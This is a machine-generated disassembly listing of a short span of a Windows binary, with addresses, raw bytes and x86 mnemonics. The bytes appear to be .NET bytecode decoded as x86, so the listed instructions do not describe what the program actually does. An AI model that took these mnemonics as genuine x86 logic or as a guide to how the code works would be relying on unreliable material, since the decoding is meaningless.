  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	0a 28                	or     (%eax),%ch
  402ba5:	11 00                	adc    %eax,(%eax)
  402ba7:	00 06                	add    %al,(%esi)
  402ba9:	28 08                	sub    %cl,(%eax)
  402bab:	00 00                	add    %al,(%eax)
  402bad:	06                   	push   %es
  402bae:	28 0a                	sub    %cl,(%edx)
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	06                   	push   %es
  402bb3:	28 0e                	sub    %cl,(%esi)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	06                   	push   %es
  402bb8:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402bbe:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402bc5:	06                   	push   %es
  402bc6:	73 3c                	jae    0x402c04
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402bcd:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402bd2:	2b 06                	sub    (%esi),%eax
  402bd4:	16                   	push   %ss
  402bd5:	28 13                	sub    %dl,(%ebx)
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	06                   	push   %es
  402bda:	de 09                	fimuls (%ecx)
  402bdc:	26 16                	es push %ss
  402bde:	28 13                	sub    %dl,(%ebx)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	06                   	push   %es
  402be3:	de 00                	fiadds (%eax)
  402be5:	2a 00                	sub    (%eax),%al
  402be7:	00 41 4c             	add    %al,0x4c(%ecx)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	c4 00                	les    (%eax),%eax
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	20 00                	and    %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	e4 00                	in     $0x0,%al
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	03 00                	add    (%eax),%eax
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	01 00                	add    %eax,(%eax)
  402c02:	00 01                	add    %al,(%ecx)
  402c04:	02 00                	add    (%eax),%al
  402c06:	00 00                	add    %al,(%eax)
  402c08:	0e                   	push   %cs
  402c09:	01 00                	add    %eax,(%eax)
  402c0b:	00 77 00             	add    %dh,0x0(%edi)
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	85 01                	test   %eax,(%ecx)
  402c12:	00 00                	add    %al,(%eax)
  402c14:	0c 00                	or     $0x0,%al
	...
  402c22:	00 00                	add    %al,(%eax)
  402c24:	94                   	xchg   %eax,%esp
  402c25:	02 00                	add    (%eax),%al
  402c27:	00 94 02 00 00 09 00 	add    %dl,0x90000(%edx,%eax,1)
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	01 00                	add    %eax,(%eax)
  402c32:	00 01                	add    %al,(%ecx)
  402c34:	1b 30                	sbb    (%eax),%esi
  402c36:	02 00                	add    (%eax),%al
  402c38:	46                   	inc    %esi
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	00 28                	add    %ch,(%eax)
  402c41:	15 00 00 06 25       	adc    $0x25060000,%eax
  402c46:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402c4b:	28 40 00             	sub    %al,0x0(%eax)
  402c4e:	00 0a                	add    %cl,(%edx)
  402c50:	28 10                	sub    %dl,(%eax)
  402c52:	00 00                	add    %al,(%eax)
  402c54:	06                   	push   %es
  402c55:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c5a:	05 28 40 00 00       	add    $0x4028,%eax
  402c5f:	0a 28                	or     (%eax),%ch
  402c61:	08 00                	or     %al,(%eax)
  402c63:	00 06                	add    %al,(%esi)
  402c65:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c6a:	05 28 41 00 00       	add    $0x4128,%eax
  402c6f:	0a 28                	or     (%eax),%ch
  402c71:	06                   	push   %es
  402c72:	00 00                	add    %al,(%eax)
  402c74:	06                   	push   %es
  402c75:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402c7a:	05 28 42 00 00       	add    $0x4228,%eax
  402c7f:	0a de                	or     %dh,%bl
  402c81:	03 26                	add    (%esi),%esp
  402c83:	de 00                	fiadds (%eax)
  402c85:	2a 00                	sub    (%eax),%al
  402c87:	00 01                	add    %al,(%ecx)
  402c89:	10 00                	adc    %al,(%eax)
  402c8b:	00 00                	add    %al,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	00 42 42             	add    %al,0x42(%edx)
  402c92:	00 03                	add    %al,(%ebx)
  402c94:	01 00                	add    %eax,(%eax)
  402c96:	00 01                	add    %al,(%ecx)
  402c98:	1b 30                	sbb    (%eax),%esi
  402c9a:	06                   	push   %es
  402c9b:	00 96 01 00 00 04    	add    %dl,0x4000001(%esi)
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	11 28                	adc    %ebp,(%eax)
  402ca5:	06                   	push   %es
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	06                   	push   %es
  402ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  402caa:	2c 00                	sub    $0x0,%al
  402cac:	00 0a                	add    %cl,(%edx)
  402cae:	2c 07                	sub    $0x7,%al
  402cb0:	28 12                	sub    %dl,(%edx)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	06                   	push   %es
  402cb5:	2d 0b 16 28 13       	sub    $0x1328160b,%eax
  402cba:	00 00                	add    %al,(%eax)
  402cbc:	06                   	push   %es
  402cbd:	dd 77 01             	fnsave 0x1(%edi)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	28 08                	sub    %cl,(%eax)
  402cc4:	00 00                	add    %al,(%eax)
  402cc6:	06                   	push   %es
  402cc7:	02 6f 43             	add    0x43(%edi),%ch
  402cca:	00 00                	add    %al,(%eax)
  402ccc:	0a 0a                	or     (%edx),%cl
  402cce:	06                   	push   %es
  402ccf:	16                   	push   %ss
  402cd0:	3e 53                	ds push %ebx
  402cd2:	01 00                	add    %eax,(%eax)
  402cd4:	00 28                	add    %ch,(%eax)
  402cd6:	0e                   	push   %cs
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	06                   	push   %es
  402cda:	06                   	push   %es
  402cdb:	6a 58                	push   $0x58
  402cdd:	28 0f                	sub    %cl,(%edi)
  402cdf:	00 00                	add    %al,(%eax)
  402ce1:	06                   	push   %es
  402ce2:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402ce5:	00 06                	add    %al,(%esi)
  402ce7:	06                   	push   %es
  402ce8:	6a 59                	push   $0x59
  402cea:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402cf0:	0c 00                	or     $0x0,%al
  402cf2:	00 06                	add    %al,(%esi)
  402cf4:	3a f3                	cmp    %bl,%dh
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	00 28                	add    %ch,(%eax)
  402cfa:	0a 00                	or     (%eax),%al
  402cfc:	00 06                	add    %al,(%esi)
  402cfe:	16                   	push   %ss
  402cff:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402d03:	0a 6a 28             	or     0x28(%edx),%ch
  402d06:	0d 00 00 06 28       	or     $0x28060000,%eax
  402d0b:	0c 00                	or     $0x0,%al
  402d0d:	00 06                	add    %al,(%esi)
  402d0f:	16                   	push   %ss
  402d10:	6a 3e                	push   $0x3e
  402d12:	b6 00                	mov    $0x0,%dh
  402d14:	00 00                	add    %al,(%eax)
  402d16:	16                   	push   %ss
  402d17:	6a 28                	push   $0x28
  402d19:	0f 00 00             	sldt   (%eax)
  402d1c:	06                   	push   %es
  402d1d:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d20:	00 06                	add    %al,(%esi)
  402d22:	d4 8d                	aam    $0x8d
  402d24:	44                   	inc    %esp
  402d25:	00 00                	add    %al,(%eax)
  402d27:	01 28                	add    %ebp,(%eax)
  402d29:	0b 00                	or     (%eax),%eax
  402d2b:	00 06                	add    %al,(%esi)
  402d2d:	2b 59 28             	sub    0x28(%ecx),%ebx
  402d30:	08 00                	or     %al,(%eax)
  402d32:	00 06                	add    %al,(%esi)
  402d34:	28 0a                	sub    %cl,(%edx)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	06                   	push   %es
  402d39:	28 0e                	sub    %cl,(%esi)
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	06                   	push   %es
  402d3e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402d44:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402d4b:	07                   	pop    %es
  402d4c:	16                   	push   %ss
  402d4d:	30 0b                	xor    %cl,(%ebx)
  402d4f:	16                   	push   %ss
  402d50:	28 13                	sub    %dl,(%ebx)
  402d52:	00 00                	add    %al,(%eax)
  402d54:	06                   	push   %es
  402d55:	dd df                	fstp   %st(7)
  402d57:	00 00                	add    %al,(%eax)
  402d59:	00 28                	add    %ch,(%eax)
  402d5b:	0e                   	push   %cs
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	06                   	push   %es
  402d5f:	07                   	pop    %es
  402d60:	6a 58                	push   $0x58
  402d62:	28 0f                	sub    %cl,(%edi)
  402d64:	00 00                	add    %al,(%eax)
  402d66:	06                   	push   %es
  402d67:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d6a:	00 06                	add    %al,(%esi)
  402d6c:	07                   	pop    %es
  402d6d:	6a 59                	push   $0x59
  402d6f:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d75:	0c 00                	or     $0x0,%al
  402d77:	00 06                	add    %al,(%esi)
  402d79:	16                   	push   %ss
  402d7a:	6a 2f                	push   $0x2f
  402d7c:	0b 16                	or     (%esi),%edx
  402d7e:	28 13                	sub    %dl,(%ebx)
  402d80:	00 00                	add    %al,(%eax)
  402d82:	06                   	push   %es
  402d83:	dd b1 00 00 00 28    	fnsave 0x28000000(%ecx)
  402d89:	0c 00                	or     $0x0,%al
  402d8b:	00 06                	add    %al,(%esi)
  402d8d:	16                   	push   %ss
  402d8e:	6a 30                	push   $0x30
  402d90:	9e                   	sahf
  402d91:	14 fe                	adc    $0xfe,%al
  402d93:	06                   	push   %es
  402d94:	92                   	xchg   %eax,%edx
  402d95:	00 00                	add    %al,(%eax)
  402d97:	06                   	push   %es
  402d98:	73 46                	jae    0x402de0
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	0a 73 47             	or     0x47(%ebx),%dh
  402d9f:	00 00                	add    %al,(%eax)
  402da1:	0a 28                	or     (%eax),%ch
  402da3:	0a 00                	or     (%eax),%al
  402da5:	00 06                	add    %al,(%esi)
  402da7:	6f                   	outsl  %ds:(%esi),(%dx)
  402da8:	48                   	dec    %eax
  402da9:	00 00                	add    %al,(%eax)
  402dab:	0a 16                	or     (%esi),%dl
  402dad:	6a 28                	push   $0x28
  402daf:	0f 00 00             	sldt   (%eax)
  402db2:	06                   	push   %es
  402db3:	1a 6a 28             	sbb    0x28(%edx),%ch
  402db6:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dbb:	0c 00                	or     $0x0,%al
  402dbd:	00 06                	add    %al,(%esi)
  402dbf:	d4 8d                	aam    $0x8d
  402dc1:	44                   	inc    %esp
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	01 28                	add    %ebp,(%eax)
  402dc6:	0b 00                	or     (%eax),%eax
  402dc8:	00 06                	add    %al,(%esi)
  402dca:	2b 31                	sub    (%ecx),%esi
  402dcc:	1a 6a 28             	sbb    0x28(%edx),%ch
  402dcf:	0d 00 00 06 28       	or     $0x28060000,%eax
  402dd4:	0c 00                	or     $0x0,%al
  402dd6:	00 06                	add    %al,(%esi)
  402dd8:	d4 8d                	aam    $0x8d
  402dda:	44                   	inc    %esp
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	01 28                	add    %ebp,(%eax)
  402ddf:	0b 00                	or     (%eax),%eax
  402de1:	00 06                	add    %al,(%esi)
  402de3:	16                   	push   %ss
  402de4:	6a 28                	push   $0x28
  402de6:	0f 00 00             	sldt   (%eax)
  402de9:	06                   	push   %es
  402dea:	2b 11                	sub    (%ecx),%edx
  402dec:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402def:	00 06                	add    %al,(%esi)
  402df1:	16                   	push   %ss
  402df2:	6a 2f                	push   $0x2f
  402df4:	08 16                	or     %dl,(%esi)
  402df6:	28 13                	sub    %dl,(%ebx)
  402df8:	00 00                	add    %al,(%eax)
  402dfa:	06                   	push   %es
  402dfb:	de 3c 28             	fidivrs (%eax,%ebp,1)
  402dfe:	08 00                	or     %al,(%eax)
  402e00:	00 06                	add    %al,(%esi)
  402e02:	28 0a                	sub    %cl,(%edx)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	06                   	push   %es
  402e07:	28 0e                	sub    %cl,(%esi)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	06                   	push   %es
  402e0c:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402e12:	69 14 fe 06 1d 00 00 	imul   $0x1d06,(%esi,%edi,8),%edx
  402e19:	06                   	push   %es
  402e1a:	73 3c                	jae    0x402e58
  402e1c:	00 00                	add    %al,(%eax)
  402e1e:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402e21:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402e26:	2b 06                	sub    (%esi),%eax
  402e28:	16                   	push   %ss
  402e29:	28 13                	sub    %dl,(%ebx)
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	06                   	push   %es
  402e2e:	de 09                	fimuls (%ecx)
  402e30:	26 16                	es push %ss
  402e32:	28 13                	sub    %dl,(%ebx)
  402e34:	00 00                	add    %al,(%eax)
  402e36:	06                   	push   %es
  402e37:	de 00                	fiadds (%eax)
  402e39:	2a 00                	sub    (%eax),%al
  402e3b:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402e46:	00 00                	add    %al,(%eax)
  402e48:	8c 01                	mov    %es,(%ecx)
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	8c 01                	mov    %es,(%ecx)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	09 00                	or     %eax,(%eax)
  402e52:	00 00                	add    %al,(%eax)
  402e54:	01 00                	add    %eax,(%eax)
  402e56:	00 01                	add    %al,(%ecx)
  402e58:	1b 30                	sbb    (%eax),%esi
  402e5a:	04 00                	add    $0x0,%al
  402e5c:	e5 00                	in     $0x0,%eax
  402e5e:	00 00                	add    %al,(%eax)
  402e60:	05 00 00 11 28       	add    $0x28110000,%eax
  402e65:	14 00                	adc    $0x0,%al
  402e67:	00 06                	add    %al,(%esi)
  402e69:	0a 16                	or     (%esi),%dl
  402e6b:	0b 06                	or     (%esi),%eax
  402e6d:	12 01                	adc    (%ecx),%al
  402e6f:	28 49 00             	sub    %cl,0x0(%ecx)
  402e72:	00 0a                	add    %cl,(%edx)
  402e74:	28 12                	sub    %dl,(%edx)
  402e76:	00 00                	add    %al,(%eax)
  402e78:	06                   	push   %es
  402e79:	2c 03                	sub    $0x3,%al
  402e7b:	02 2d 05 dd c5 00    	add    0xc5dd05,%ch
  402e81:	00 00                	add    %al,(%eax)
  402e83:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402e89:	00 0a                	add    %cl,(%edx)
  402e8b:	0c 28                	or     $0x28,%al
  402e8d:	06                   	push   %es
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	06                   	push   %es
  402e91:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402e96:	00 0a                	add    %cl,(%edx)
  402e98:	26 28 08             	sub    %cl,%es:(%eax)
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	06                   	push   %es
  402e9e:	08 16                	or     %dl,(%esi)
  402ea0:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402ea6:	00 0a                	add    %cl,(%edx)
  402ea8:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402eae:	0f 00                	(bad)
  402eb0:	31 5b 02             	xor    %ebx,0x2(%ebx)
  402eb3:	73 4d                	jae    0x402f02
  402eb5:	00 00                	add    %al,(%eax)
  402eb7:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402ebd:	16                   	push   %ss
  402ebe:	6a 6f                	push   $0x6f
  402ec0:	4e                   	dec    %esi
  402ec1:	00 00                	add    %al,(%eax)
  402ec3:	0a 20                	or     (%eax),%ah
  402ec5:	50                   	push   %eax
  402ec6:	c3                   	ret
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402ecd:	01 13                	add    %edx,(%ebx)
  402ecf:	05 2b 1c 28 06       	add    $0x6281c2b,%eax
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	06                   	push   %es
  402ed7:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402edc:	00 0a                	add    %cl,(%edx)
  402ede:	26 28 08             	sub    %cl,%es:(%eax)
  402ee1:	00 00                	add    %al,(%eax)
  402ee3:	06                   	push   %es
  402ee4:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402eea:	4c                   	dec    %esp
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	0a 09                	or     (%ecx),%cl
  402eef:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402ef5:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402efc:	13 04 16             	adc    (%esi,%edx,1),%eax
  402eff:	30 d1                	xor    %dl,%cl
  402f01:	de 30                	fidivs (%eax)
  402f03:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402f06:	09 6f 33             	or     %ebp,0x33(%edi)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	0a dc                	or     %ah,%bl
  402f0d:	28 06                	sub    %al,(%esi)
  402f0f:	00 00                	add    %al,(%eax)
  402f11:	06                   	push   %es
  402f12:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f17:	00 0a                	add    %cl,(%edx)
  402f19:	26 28 08             	sub    %cl,%es:(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	06                   	push   %es
  402f1f:	02 16                	add    (%esi),%dl
  402f21:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  402f27:	00 0a                	add    %cl,(%edx)
  402f29:	28 08                	sub    %cl,(%eax)
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	06                   	push   %es
  402f2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f2f:	4f                   	dec    %edi
  402f30:	00 00                	add    %al,(%eax)
  402f32:	0a de                	or     %dh,%bl
  402f34:	13 26                	adc    (%esi),%esp
  402f36:	16                   	push   %ss
  402f37:	28 13                	sub    %dl,(%ebx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	06                   	push   %es
  402f3c:	de 0a                	fimuls (%edx)
  402f3e:	07                   	pop    %es
  402f3f:	2c 06                	sub    $0x6,%al
  402f41:	06                   	push   %es
  402f42:	28 50 00             	sub    %dl,0x0(%eax)
  402f45:	00 0a                	add    %cl,(%edx)
  402f47:	dc 2a                	fsubrl (%edx)
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	00 01                	add    %al,(%ecx)
  402f4d:	28 00                	sub    %al,(%eax)
  402f4f:	00 02                	add    %al,(%edx)
  402f51:	00 55 00             	add    %dl,0x0(%ebp)
  402f54:	4a                   	dec    %edx
  402f55:	9f                   	lahf
  402f56:	00 0a                	add    %cl,(%edx)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	00 00                	add    %al,(%eax)
  402f5e:	10 00                	adc    %al,(%eax)
  402f60:	c1 d1 00             	rcl    $0x0,%ecx
  402f63:	09 01                	or     %eax,(%ecx)
  402f65:	00 00                	add    %al,(%eax)
  402f67:	01 02                	add    %eax,(%edx)
  402f69:	00 08                	add    %cl,(%eax)
  402f6b:	00 d2                	add    %dl,%dl
  402f6d:	da 00                	fiaddl (%eax)
  402f6f:	0a 00                	or     (%eax),%al
  402f71:	00 00                	add    %al,(%eax)
  402f73:	00 13                	add    %dl,(%ebx)
  402f75:	30 05 00 86 00 00    	xor    %al,0x8600
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 73 62             	add    %dh,0x62(%ebx)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	06                   	push   %es
  402f85:	25 72 81 20 00       	and    $0x208172,%eax
  402f8a:	70 6f                	jo     0x402ffb
  402f8c:	4d                   	dec    %ebp
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	06                   	push   %es
  402f90:	72 8f                	jb     0x402f21
  402f92:	20 00                	and    %al,(%eax)
  402f94:	70 6f                	jo     0x403005
  402f96:	5a                   	pop    %edx
  402f97:	00 00                	add    %al,(%eax)
  402f99:	06                   	push   %es
  402f9a:	25 72 99 20 00       	and    $0x209972,%eax
  402f9f:	70 6f                	jo     0x403010
  402fa1:	4d                   	dec    %ebp
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	06                   	push   %es
  402fa5:	72 a9                	jb     0x402f50
  402fa7:	20 00                	and    %al,(%eax)
  402fa9:	70 7e                	jo     0x403029
  402fab:	10 00                	adc    %al,(%eax)
  402fad:	00 04 28             	add    %al,(%eax,%ebp,1)
  402fb0:	8e 00                	mov    (%eax),%es
  402fb2:	00 06                	add    %al,(%esi)
  402fb4:	25 2d 06 26 72       	and    $0x7226062d,%eax
  402fb9:	b7 20                	mov    $0x20,%bh
  402fbb:	00 70 28             	add    %dh,0x28(%eax)
  402fbe:	51                   	push   %ecx
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	0a 6f 5a             	or     0x5a(%edi),%ch
  402fc4:	00 00                	add    %al,(%eax)
  402fc6:	06                   	push   %es
  402fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc8:	57                   	push   %edi
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	06                   	push   %es
  402fcc:	28 1e                	sub    %bl,(%esi)
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	06                   	push   %es
  402fd1:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402fd7:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  402fdc:	28 40 00             	sub    %al,0x0(%eax)
  402fdf:	00 0a                	add    %cl,(%edx)
  402fe1:	16                   	push   %ss
  402fe2:	28 18                	sub    %bl,(%eax)
  402fe4:	00 00                	add    %al,(%eax)
  402fe6:	06                   	push   %es
  402fe7:	14 fe                	adc    $0xfe,%al
  402fe9:	06                   	push   %es
  402fea:	20 00                	and    %al,(%eax)
  402fec:	00 06                	add    %al,(%esi)
  402fee:	73 3a                	jae    0x40302a
  402ff0:	00 00                	add    %al,(%eax)
  402ff2:	0a 14 17             	or     (%edi,%edx,1),%dl
  402ff5:	17                   	pop    %ss
  402ff6:	73 3b                	jae    0x403033
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	0a 28                	or     (%eax),%ch
  402ffc:	16                   	push   %ss
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	06                   	push   %es
  403000:	28 52 00             	sub    %dl,0x0(%edx)
  403003:	00 0a                	add    %cl,(%edx)
  403005:	2a 00                	sub    (%eax),%al
  403007:	00 13                	add    %dl,(%ebx)
  403009:	30 03                	xor    %al,(%ebx)
  40300b:	00 38                	add    %bh,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	00 06                	add    %al,(%esi)
  403011:	00 00                	add    %al,(%eax)
  403013:	11 73 53             	adc    %esi,0x53(%ebx)
  403016:	00 00                	add    %al,(%eax)
  403018:	0a 0a                	or     (%edx),%cl
  40301a:	02 0b                	add    (%ebx),%cl
  40301c:	16                   	push   %ss
  40301d:	0c 2b                	or     $0x2b,%al
  40301f:	1f                   	pop    %ds
  403020:	07                   	pop    %es
  403021:	08 91 0d 06 72 bb    	or     %dl,-0x448df9f3(%ecx)
  403027:	20 00                	and    %al,(%eax)
  403029:	70 09                	jo     0x403034
  40302b:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  40302f:	01 28                	add    %ebp,(%eax)
  403031:	54                   	push   %esp
  403032:	00 00                	add    %al,(%eax)
  403034:	0a 6f 55             	or     0x55(%edi),%ch
  403037:	00 00                	add    %al,(%eax)
  403039:	0a 26                	or     (%esi),%ah
  40303b:	08 17                	or     %dl,(%edi)
  40303d:	58                   	pop    %eax
  40303e:	0c 08                	or     $0x8,%al
  403040:	07                   	pop    %es
  403041:	8e 69 32             	mov    0x32(%ecx),%gs
  403044:	db 06                	fildl  (%esi)
  403046:	6f                   	outsl  %ds:(%esi),(%dx)
  403047:	38 00                	cmp    %al,(%eax)
  403049:	00 0a                	add    %cl,(%edx)
  40304b:	2a 13                	sub    (%ebx),%dl
  40304d:	30 03                	xor    %al,(%ebx)
  40304f:	00 38                	add    %bh,(%eax)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 06                	add    %al,(%esi)
  403055:	00 00                	add    %al,(%eax)
  403057:	11 73 53             	adc    %esi,0x53(%ebx)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	0a 0a                	or     (%edx),%cl
  40305e:	02 0b                	add    (%ebx),%cl
  403060:	16                   	push   %ss
  403061:	0c 2b                	or     $0x2b,%al
  403063:	1f                   	pop    %ds
  403064:	07                   	pop    %es
  403065:	08 91 0d 06 72 cb    	or     %dl,-0x348df9f3(%ecx)
  40306b:	20 00                	and    %al,(%eax)
  40306d:	70 09                	jo     0x403078
  40306f:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  403073:	01 28                	add    %ebp,(%eax)
  403075:	54                   	push   %esp
  403076:	00 00                	add    %al,(%eax)
  403078:	0a 6f 55             	or     0x55(%edi),%ch
  40307b:	00 00                	add    %al,(%eax)
  40307d:	0a 26                	or     (%esi),%ah
  40307f:	08 17                	or     %dl,(%edi)
  403081:	58                   	pop    %eax
  403082:	0c 08                	or     $0x8,%al
  403084:	07                   	pop    %es
  403085:	8e 69 32             	mov    0x32(%ecx),%gs
  403088:	db 06                	fildl  (%esi)
  40308a:	6f                   	outsl  %ds:(%esi),(%dx)
  40308b:	38 00                	cmp    %al,(%eax)
  40308d:	00 0a                	add    %cl,(%edx)
  40308f:	2a 13                	sub    (%ebx),%dl
  403091:	30 04 00             	xor    %al,(%eax,%eax,1)
  403094:	29 00                	sub    %eax,(%eax)
  403096:	00 00                	add    %al,(%eax)
  403098:	07                   	pop    %es
  403099:	00 00                	add    %al,(%eax)
  40309b:	11 02                	adc    %eax,(%edx)
  40309d:	8e 69 8d             	mov    -0x73(%ecx),%gs
  4030a0:	44                   	inc    %esp
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	01 0a                	add    %ecx,(%edx)
  4030a5:	02 8e 69 17 59 0b    	add    0xb591769(%esi),%cl
  4030ab:	16                   	push   %ss
  4030ac:	0c 2b                	or     $0x2b,%al
  4030ae:	0e                   	push   %cs
  4030af:	06                   	push   %es
  4030b0:	08 02                	or     %al,(%edx)
  4030b2:	07                   	pop    %es
  4030b3:	91                   	xchg   %eax,%ecx
  4030b4:	9c                   	pushf
  4030b5:	07                   	pop    %es
  4030b6:	17                   	pop    %ss
  4030b7:	59                   	pop    %ecx
  4030b8:	0b 08                	or     (%eax),%ecx
  4030ba:	17                   	pop    %ss
  4030bb:	58                   	pop    %eax
  4030bc:	0c 08                	or     $0x8,%al
  4030be:	06                   	push   %es
  4030bf:	8e 69 32             	mov    0x32(%ecx),%gs
  4030c2:	ec                   	in     (%dx),%al
  4030c3:	06                   	push   %es
  4030c4:	2a 00                	sub    (%eax),%al
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	13 30                	adc    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	33 00                	xor    (%eax),%eax
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	01 00                	add    %eax,(%eax)
  4030d2:	00 11                	add    %dl,(%ecx)
  4030d4:	16                   	push   %ss
  4030d5:	0a 2b                	or     (%ebx),%ch
  4030d7:	15 02 7b 26 00       	adc    $0x267b02,%eax
  4030dc:	00 04 06             	add    %al,(%esi,%eax,1)
  4030df:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e0:	59                   	pop    %ecx
  4030e1:	00 00                	add    %al,(%eax)
  4030e3:	0a 6f 39             	or     0x39(%edi),%ch
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	06                   	push   %es
  4030e9:	06                   	push   %es
  4030ea:	17                   	pop    %ss
  4030eb:	58                   	pop    %eax
  4030ec:	0a 06                	or     (%esi),%al
  4030ee:	02 7b 26             	add    0x26(%ebx),%bh
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 6f                	add    $0x6f,%al
  4030f5:	5a                   	pop    %edx
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	0a 32                	or     (%edx),%dh
  4030fa:	dd 02                	fldl   (%edx)
  4030fc:	7b 26                	jnp    0x403124
  4030fe:	00 00                	add    %al,(%eax)
  403100:	04 6f                	add    $0x6f,%al
  403102:	5c                   	pop    %esp
  403103:	00 00                	add    %al,(%eax)
  403105:	0a 2a                	or     (%edx),%ch
  403107:	00 13                	add    %dl,(%ebx)
  403109:	30 02                	xor    %al,(%edx)
  40310b:	00 1b                	add    %bl,(%ebx)
  40310d:	00 00                	add    %al,(%eax)
  40310f:	00 08                	add    %cl,(%eax)
  403111:	00 00                	add    %al,(%eax)
  403113:	11 73 62             	adc    %esi,0x62(%ebx)
  403116:	00 00                	add    %al,(%eax)
  403118:	06                   	push   %es
